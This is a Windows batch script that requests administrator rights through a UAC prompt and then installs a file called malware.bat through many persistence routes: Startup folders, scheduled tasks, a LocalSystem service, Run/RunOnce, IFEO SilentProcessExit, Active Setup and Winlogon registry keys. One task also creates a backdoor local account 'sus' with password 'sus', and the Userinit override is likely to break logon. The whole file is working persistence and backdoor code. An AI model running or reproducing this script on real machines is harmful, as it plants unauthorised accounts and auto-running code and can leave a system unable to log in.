@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------
setlocal

:: Copy setup.bat into temp folder
copy /Y %~dp0setup.bat "C:\Windows\Temp\setup.bat"

:: Create files for Startup
echo @echo off > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
echo echo hacked by the way >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
echo pause >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
echo echo hacked by the way >> "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"
echo pause >> "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat"

:: Create scheduled tasks
SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F

copy /Y "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat" "C:\Windows\Temp\malware.bat"

:: Create service
sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem" /f

:: Create registry keys for autorun
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d C:\Windows\Temp\malware.bat /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f

:: Create Active Setup key
reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d C:\Windows\Temp\malware.bat /f

:: Create registry keys for winlogin
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d C:\Windows\Temp\malware.bat /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Windows\Temp\malware.bat" /f

PAUSE
